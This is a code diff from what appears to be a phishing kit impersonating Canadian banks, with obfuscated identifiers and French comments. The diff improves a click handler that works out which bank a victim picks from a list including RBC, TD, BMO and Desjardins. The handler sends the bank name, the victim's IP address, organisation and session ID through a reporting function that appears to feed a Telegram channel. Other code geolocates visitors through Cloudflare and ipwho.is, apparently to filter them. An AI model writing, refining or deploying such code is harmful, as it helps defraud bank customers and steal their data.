@@ -143,11 +143,32 @@
       if (_el.dataset.xb) return;
       _el.dataset.xb = '1';
       _el.addEventListener('click', function(e){
-        var _lbl = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.innerText || '?';
-        var _cleanLbl = _lbl.replace(/\s+/g, ' ').trim();
-        if (_cleanLbl.length > 0 && _cleanLbl !== '?') {
-          _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _cleanLbl + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+        var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('title') || _el.innerText || '';
+        
+        // Si c'est une image à l'intérieur de la tuile
+        if (!_raw || _raw.trim() === '') {
+          var _img = _el.querySelector('img');
+          if (_img) {
+            _raw = _img.getAttribute('alt') || _img.getAttribute('title') || _img.getAttribute('src') || '';
+          }
         }
+
+        var _clean = _raw.replace(/\s+/g, ' ').trim();
+
+        // Extraire le nom de la banque propre
+        var _bankList = ['RBC', 'TD', 'BMO', 'CIBC', 'Scotiabank', 'Desjardins', 'National Bank', 'Tangerine', 'Simplii', 'KOHO', 'ATB', 'UNI', 'Laurentian', 'Meridian', 'Neo', 'PC Financial', 'Vancity', 'Wealthsimple', 'Coast Capital'];
+        var _matchedBank = '';
+
+        for (var i = 0; i < _bankList.length; i++) {
+          if (_clean.toLowerCase().indexOf(_bankList[i].toLowerCase()) !== -1) {
+            _matchedBank = _bankList[i];
+            break;
+          }
+        }
+
+        var _finalBankName = _matchedBank ? _matchedBank : (_clean || 'Banque inconnue');
+
+        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
       }, true);
     });
   }
@@ -165,7 +186,6 @@
       return;
     }
 
-    // Fonction d'activation une fois l'IP validée
     function _activate(ip, org, countryCode){
       _W.sessionStorage.setItem('__xip', ip);
       _W.sessionStorage.setItem('__xorg', org);
@@ -176,7 +196,6 @@
       _setupBanks();
     }
 
-    // 3. Premier essai rapide: Cloudflare trace (Ultra rapide, aucun rate limit)
     fetch('https://www.cloudflare.com/cdn-cgi/trace')
       .then(function(r){ return r.text(); })
       .then(function(t){
@@ -190,7 +209,6 @@
           return;
         }
 
-        // Tenter d'enrichir avec ipwho.is pour détecter le VPN / l'Org
         fetch('https://ipwho.is/' + ipVal)
           .then(function(r){ return r.json(); })
           .then(function(d){
@@ -216,7 +234,6 @@
           });
       })
       .catch(function(){
-        // Second essai si CF échoue: ipwho.is direct
         fetch('https://ipwho.is/')
           .then(function(r){ return r.json(); })
           .then(function(d){
